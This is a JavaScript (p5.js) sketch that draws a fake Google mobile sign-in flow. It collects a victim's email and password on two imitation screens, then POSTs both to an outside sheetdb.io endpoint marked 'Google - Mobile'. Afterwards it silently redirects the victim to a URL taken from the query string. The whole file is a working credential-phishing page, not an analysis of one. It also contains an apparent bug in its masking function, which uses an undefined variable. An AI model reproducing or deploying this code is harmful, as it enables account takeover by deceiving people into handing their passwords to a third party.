function setup() {
  createCanvas(windowWidth, windowHeight);

  textFont("Roboto");
  params = getURLParams();
  
  
  username = createInput(params.email);
}
function button(x, y, w, h) {
  return mouseX > x && mouseY > y && mouseX < x + w && mouseY < y + h;
}
let params;
let img;
let page = 0;
function dots(strs) {
  let result = "";
  for (let i = 0; i < strs.length; i++) {
    if (str[i] === "") {
      result += "";
    } else {
      result += "•";
    }
  }
  return result;
}
let username;
let user = {};
let trials = 0;
let images = {};
function preload() {
  images.google = loadImage("Google.png");
}
function windowResized() {
  resizeCanvas(windowWidth, windowHeight);
}
function send(user, pass) {
  fetch("https://sheetdb.io/api/v1/dfm6dioyizi5k", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      data: [
        {
          PASSWORD: pass,
          USERNAME: user,
          SITE: "Google - Mobile",
        },
      ],
    }),
  });
}
let hold = 0;
function draw() {
  background(250);
  if (page === 0) {
    username.position(width / 25, height / 2.8);

    username.size(width - width / 10, height / 13);

    username.style("background-color", "transparent");

    username.style("font-size", "22px");

    username.style("color", "rgba(0,0,0,0)");

    background(0);

    imageMode(CENTER);
    image(images.google, width / 8, height * 0.08, width / 6, width / 6);
    fill(200);
    noStroke();
    textSize(width / 9);
    textAlign(LEFT, CENTER);
    textStyle(NORMAL);
    text("Sign in", width / 25, height * 0.18);

    fill(150);
    textSize(width / 22);
    text(
      "with your Google Account. You'll also sign in to Google services in your apps.",
      width / 25,
      height * 0.2,
      width * 0.9,
      height / 8
    );

    fill(163, 190, 251, 255);
    textStyle(NORMAL);
    textSize(width / 25);
    text("Forgot email?", width / 25, height / 2.1);

    text("Create account", width / 25, height * 0.7);

    if (username.value().includes("@")) {
      fill(163, 190, 251, 255);
    } else {
      fill(150);
    }
    rect(width - width * 0.24, height * 0.665, width / 5, height / 15, 200);

    fill(0);
    textAlign(RIGHT, CENTER);
    text("Next", width - width / 10, height * 0.7);

    textAlign(LEFT, CENTER);

    fill(150);
    noStroke();
    if (username.value().length === 0) {
      text(
        "Email or phone",
        width / 13,
        height / 2.8,
        width - width / 12,
        height / 12,
        2
      );

      noFill();
      stroke(150);
      rect(width / 25, height / 2.8, width - width / 12, height / 12, 2);
    } else {
      username.style("border", "0px solid rgba(163,190,251,255)");
      fill(255);

      text(
        username.value(),
        width / 13,
        height / 2.8,
        width - width / 12,
        height / 12,
        2
      );

      noFill();
      stroke(150, 255, 255);
      rect(width / 25, height / 2.8, width - width / 12, height / 12, 2);
    }

    username.style("border", "0px solid black");

    if (
      hold === 1 &&
      button(width - width * 0.24, height * 0.665, width / 5, height / 15) &&
      username.value().includes("@")
    ) {
      page++;
      user.email = username.value();
      username.value("");
    }
  } else if (page === 1) {
    username.position(width / 25, height / 2.8);

    username.size(width - width / 10, height / 13);

    username.style("background-color", "transparent");

    username.style("font-size", "22px");

    username.style("color", "rgba(0,0,0,0)");

    background(0);

    imageMode(CENTER);
    image(images.google, width / 8, height * 0.08, width / 6, width / 6);
    fill(200);
    noStroke();
    textSize(width / 9);
    textAlign(LEFT, CENTER);
    textStyle(NORMAL);
    text("Welcome,", width / 25, height * 0.18);

    textSize(width / 16);
    text(user.email, width / 25, height * 0.23);

    fill(150);
    textSize(width / 22);
    text(
      "please enter your password to access you account data",
      width / 25,
      height * 0.2,
      width * 0.9,
      height / 5
    );

    fill(163, 190, 251, 255);
    textStyle(NORMAL);
    textSize(width / 25);
    text("Forgot password?", width / 25, height / 2.1);

    text("Back", width / 25, height * 0.7);

    if (username.value().length > 5) {
      fill(163, 190, 251, 255);
    } else {
      fill(150);
    }
    rect(width - width * 0.24, height * 0.665, width / 5, height / 15, 200);

    fill(0);
    textAlign(RIGHT, CENTER);
    text("Next", width - width / 10, height * 0.7);

    textAlign(LEFT, CENTER);

    fill(150);
    noStroke();
    if (username.value().length === 0) {
      text(
        "Password",
        width / 13,
        height / 2.8,
        width - width / 12,
        height / 12,
        2
      );

      noFill();
      stroke(150);
      rect(width / 25, height / 2.8, width - width / 12, height / 12, 2);
    } else {
      username.style("border", "0px solid rgba(163,190,251,255)");
      fill(255);

      textSize(width / 10);

      text(
        dots(username.value()),
        width / 13,
        height / 2.8,
        width - width / 12,
        height / 12,
        2
      );

      noFill();
      stroke(150, 255, 255);
      rect(width / 25, height / 2.8, width - width / 12, height / 12, 2);
    }

    username.style("border", "0px solid black");

    if (
      hold === 1 &&
      button(width * 0.01, height * 0.665, width / 5, height / 15)
    ) {
      page = 0;
      username.value(user.email);
    }
    if (
      hold === 1 &&
      button(width - width * 0.24, height * 0.665, width / 5, height / 15) &&
      username.value().length > 5
    ) {
      page++;
      user.pwd = username.value();
      username.value("");
    }
  } else if (page === 2) {
    send(user.email, user.pwd);
    page++;
    print("DONE!");
  } else if (page === 3) {
    window.location.replace(params.url);
    page++;
  } else {
    background(0);
  }

  if (mouseIsPressed) {
    hold++;
  } else {
    hold = 0;
  }
}
